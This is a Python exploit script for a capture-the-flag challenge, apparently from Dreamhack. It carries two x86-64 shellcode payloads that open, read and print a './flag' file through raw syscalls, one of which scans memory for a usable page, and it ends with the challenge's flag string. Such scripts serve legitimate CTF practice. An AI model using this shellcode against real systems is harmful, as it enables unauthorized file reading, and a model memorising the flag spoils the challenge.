#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwnie import *
from subprocess import check_output
from time import sleep

context.update(
    log_level='debug',
    binary=ELF('./prob', checksec=False),
    terminal=[
        "wt.exe", "-w", "0", "split-pane", "--size", "0.65", "-d", ".",
        "wsl.exe", "-d", "Ubuntu-22.04", "--", "bash", "-c"
    ]
)
exe = context.binary
libc = exe.libc

gdbscript = '''
init-pwndbg
# init-gef-bata
brva 0x14FF
brva 0x16A6
c
'''

def start(argv=[]):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2])
    elif args.DOCKER:
        p = remote("localhost", 5000)
        context.update(terminal=['tmux', 'new-window', '-n', 'GDB-Debug', '-P', '-d']) # Need to use tmux
        sleep(0.5)
        pid = int(check_output(["pidof", "-s", "/app/run"]))
        gdb.attach(int(pid), gdbscript=gdbscript+f"\n set sysroot /proc/{pid}/root\nfile /proc/{pid}/exe", exe=exe.path)
        pause()
        return p
    elif args.QEMU:
        if args.GDB:
            # Open port 5000 for target remote in GDB
            return process(["qemu-aarch64", "-g", "5000", "-L", "/usr/aarch64-linux-gnu", exe.path] + argv)
        else:
            return process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu", exe.path] + argv)
    else:
        return process([exe.path] + argv, aslr=True)

def one_gadget(filename, base_addr=0):
  return [(int(i)+base_addr) for i in check_output(['one_gadget', '--raw', '-l0', filename]).decode().split(' ')]

def debug():
    gdb.attach(p, gdbscript=gdbscript)
    pause()

# ==================== EXPLOIT ====================
p = start()

if args.M1:
    sc = asm('''
        xor     r13, r13
        xor     rdi, rdi

        mov     r13, [rbp-0x44]
        mov     r13d, r13d
        mov     rdi, r13
        mov     rax, 0x67616c662f2e   /* ./flag */
        mov     QWORD PTR [rdi], rax

        xor     rax, rax
        xor     rsi, rsi
        xor     rdx, rdx
        mov     al, 2
        syscall

        mov     rdi, rax
        mov     rsi, r13
        mov     rdx, 0x100
        xor     rax, rax
        syscall

        mov     rdi, 1
        mov     rsi, r13
        mov     rdx, rax
        xor     rax, rax
        mov     al, 1
        syscall
    ''', arch='amd64')

else:
    sc = asm('''
    xor r13, r13

    find_address:
        mov rax, 0x1
        mov rdi, 0x1
        mov rdx, 0x30
        add r13, 0x1000
        mov rsi, r13
        syscall
        cmp rax, 0xfffffffffffffff2
        je find_address

        xor rdi, rdi
        mov rdi, r13
        mov rax, 0x67616c662f2e   /* ./flag */
        mov QWORD PTR [rdi], rax
        xor rax, rax
        xor rsi, rsi
        xor rdx, rdx
        mov al, 2
        syscall

        mov rdi, rax
        add r13, 0x500
        mov rsi, r13
        mov rdx, 0x100
        xor rax, rax
        syscall

        mov rdi, 1
        mov rsi, r13
        mov rdx, rax
        xor rax, rax
        mov al, 1
        syscall
    ''', arch='amd64')

# debug()
s(sc)

interactive(flag=False)
# DH{b7c992d0974343:PIUPZoMHiGoW8Uf8hwuZEw==}
